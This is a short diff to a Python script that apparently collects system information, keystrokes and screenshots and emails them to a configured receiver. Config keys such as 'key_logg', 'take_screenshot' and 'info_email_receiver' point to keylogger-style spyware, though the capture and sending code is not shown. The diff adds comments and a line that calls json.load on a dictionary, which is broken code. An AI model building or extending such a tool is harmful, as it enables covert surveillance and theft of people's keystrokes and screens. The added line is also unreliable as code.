@@ -26,7 +26,9 @@ from email.mime.application import MIMEApplication
 import glob
 
 system = platform.system()
+
 #edit what you want 
+#require email info
 data = {    
     "info_email_receiver": "",
     "send_info": True,
@@ -199,7 +201,7 @@ def system_info():
 if system == "Linux" or system == "Windows":
 
    
-    
+    data = json.load(data)
     keylog = data["key_logg"]
     screenshot = data["take_screenshot"]
     screenshot_time = data["screenshot_time"]
